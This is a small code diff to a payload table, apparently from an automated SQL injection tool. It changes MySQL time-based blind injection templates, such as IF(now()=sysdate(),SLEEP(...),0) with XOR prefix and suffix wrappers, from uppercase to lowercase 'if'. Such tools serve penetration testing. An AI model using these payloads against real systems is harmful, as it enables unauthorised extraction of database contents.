@@ -468,7 +468,7 @@ PAYLOADS = {
                 "dbms": "MySQL",
             },
             {
-                "payload": "IF(now()=sysdate(),SLEEP([SLEEPTIME]),0)",
+                "payload": "if(now()=sysdate(),SLEEP([SLEEPTIME]),0)",
                 "comments": [
                     {"pref": "'XOR(", "suf": ")XOR'Z"},
                     {"pref": '"XOR(', "suf": ')XOR"Z'},
@@ -488,7 +488,7 @@ PAYLOADS = {
                     # {"pref": '") OR ', "suf": 'OR("1"="1-- wXyW'},
                 ],
                 "title": "MySQL >= 5.0.12 time-based blind (IF - comment)",
-                "vector": "IF([INFERENCE],SLEEP([SLEEPTIME]),0)",
+                "vector": "if([INFERENCE],SLEEP([SLEEPTIME]),0)",
                 "dbms": "MySQL",
             },
             {
